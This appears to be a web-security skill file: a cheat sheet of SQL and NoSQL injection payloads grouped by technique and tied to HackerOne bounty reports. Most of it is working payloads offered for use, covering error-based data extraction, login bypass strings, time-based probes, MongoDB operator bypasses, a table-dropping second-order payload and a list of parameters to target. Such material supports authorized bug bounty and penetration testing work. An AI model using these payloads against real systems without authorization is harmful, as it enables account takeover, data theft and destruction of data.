---
name: "h1-sqli-techniques"
description: "SQL Injection patterns from HackerOne reports — blind boolean-based, error-based, time-based, WebSocket SQLi, login bypass, and data exfiltration techniques"
category: web-security
tags: ["sqli", "sql-injection", "blind-sqli", "error-based", "hackerone"]
relevance: 10
---

# H1 SQL Injection Techniques

Real-world SQLi vulnerabilities with $300-$5000 bounties:

## 1. Blind Boolean-Based SQLi
Report: Mail.ru blind SQLi through GET ($5000)
- Payload: `?id=1 AND 1=1--` → true
- Payload: `?id=1 AND 1=2--` → false
- Detection: Compare response content/status between true/false

## 2. Error-Based SQLi
Report: Mail.ru error-based SQLi through GET ($1500)
- Payload: `?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--`
- Payload: `?id=1' AND GTID_SUBSET(CONCAT(0x7e,(SELECT user())),1)--`
- Look for: SQL error messages in response

## 3. WebSocket SQLi
Report: GitHub Security Lab SQLi via WebSocket API ($1800)
- Test: WebSocket endpoints with DocID/userID parameters
- Payload: `{"docId": "1' OR '1'='1"}`

## 4. Login Bypass SQLi
Test all login forms:
```
POST /login
username: admin' OR '1'='1'--
password: test
```

## 5. Second-Order SQLi
- Inject payload into one field (profile name, address)
- Trigger in another operation (report generation, admin view)
- Payload: `'; DROP TABLE users--`

## 6. Time-Based Blind SQLi
- Payload: `?id=1' AND SLEEP(5)--`
- Payload: `?id=1' AND WAITFOR DELAY '0:0:5'--`
- Payload: `?id=1' AND pg_sleep(5)--`

## 7. NoSQL Injection
- Test JSON endpoints with MongoDB operators:
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"id": {"$ne": null}}
{"$where": "this.password.length > 0"}
```

## Key Parameters to Test:
`id`, `user_id`, `product_id`, `order_id`, `doc_id`, `file_id`, `category_id`, `page`, `search`, `q`, `s`, `sort`, `order`, `filter`
